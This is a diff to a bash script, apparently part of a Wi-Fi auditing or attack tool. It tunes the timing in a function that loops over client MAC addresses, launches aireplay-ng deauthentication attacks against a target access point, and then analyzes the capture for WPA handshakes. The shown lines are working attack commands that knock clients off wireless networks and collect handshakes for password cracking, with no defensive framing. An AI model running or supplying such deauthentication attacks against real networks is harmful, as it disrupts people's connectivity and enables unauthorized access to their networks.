@@ -600,7 +600,7 @@ fautocap()																#Deauth targets and collect handshakes
 									aireplay-ng -0 2 -a $BSSID -c $CLIENT $MON1 | grep sdvds&
 									sleep 1.8
 									echo $RED" [*] $GRN Deauth Client number $MACNUM: $CLIENT$RED Launched"
-									sleep 1
+									sleep 0.5
 								done
 							sleep 3
 						else
@@ -624,7 +624,7 @@ fautocap()																#Deauth targets and collect handshakes
 											aireplay-ng -0 3 -a $BSSID -c $CLIENT $MON2 | grep rvzsdb&
 											sleep 2.8
 											echo $RED" [*] $GRN Deauth Client number $MACNUM: $CLIENT$RED Launched"
-											sleep 1
+											sleep 0.5
 										done
 									sleep 3
 								else
@@ -650,14 +650,13 @@ fautocap()																#Deauth targets and collect handshakes
 									aireplay-ng -0 2 -a $BSSID -c $CLIENT $MON1 | grep rvzsdb&
 									sleep 1.8
 									echo $RED" [*] $GRN Deauth Client number $MACNUM: $CLIENT$RED Launched"
-									sleep 1
 								done
-							sleep 2
-							echo;sleep 8
+							sleep 6
 					fi
 					
 			fi
 			CLINUM=$((CLINUM + 1))
+			echo
 			echo $BLU" [*] Analyzing pcap for handshake [*] "$RST
 			EDONE=""
 			fanalyze
